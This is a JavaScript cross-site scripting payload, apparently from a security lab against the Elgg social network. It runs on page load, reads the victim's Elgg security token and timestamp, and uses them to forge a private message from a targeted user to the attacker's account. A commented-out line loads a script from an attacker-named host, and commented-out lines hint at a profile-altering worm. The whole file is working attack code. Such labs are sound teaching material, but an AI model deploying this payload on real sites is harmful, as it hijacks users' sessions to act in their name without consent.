//<script type="text/javascript" src="http://www.xsslabattacker.com/send_message.js"></script>


window.onload = function(){
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    //var userName=elgg.session.user.name;
    //var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    //var description = "&description=SAMY is MY HERO";	
    //var accesslevel = "&accesslevel[description]=2";
    var rec = "&recipients=&recipients[]=47";
    var sub = "&subject=One true sentence&body=<p>You are the one true King</p> ";
    //var body = "&recipients=&recipients[]=47";
    //Construct the content of your url.
    //var content=token + ts + userName + description + accesslevel + guid; 
    var content = token + ts + rec + sub;			
    var samyGuid=47; 
    var aliceGuid=44;
    var sendurl="http://www.xsslabelgg.com/action/messages/send";
    if(elgg.session.user.guid!=samyGuid && elgg.session.user.guid==aliceGuid)
    {
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
